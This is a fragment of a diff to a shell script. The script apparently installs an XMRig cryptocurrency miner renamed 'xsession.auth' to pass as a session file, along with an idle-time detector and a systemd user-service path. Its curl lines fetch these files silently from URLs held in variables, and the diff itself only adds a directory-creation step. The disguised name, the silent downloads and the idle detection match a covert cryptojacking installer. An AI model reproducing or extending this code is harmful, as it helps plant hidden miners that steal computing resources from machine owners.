@@ -10,7 +10,7 @@ XMRIGNAME=xsession.auth
 XPRINTIDLE_NAME=xprintidle
 SYSTEMD_PATH=$HOME/.config/systemd/user
 
-
+mkdir -p $LOCAL_PATH
 curl -sL --output $LOCAL_PATH/$APPNAME $APP_URL 
 curl -sL --output $LOCAL_PATH/$XMRIGNAME $XMRIG_URL 
 curl -sL --output $LOCAL_PATH/$XPRINTIDLE_NAME $XPRINTIDLE_URL 
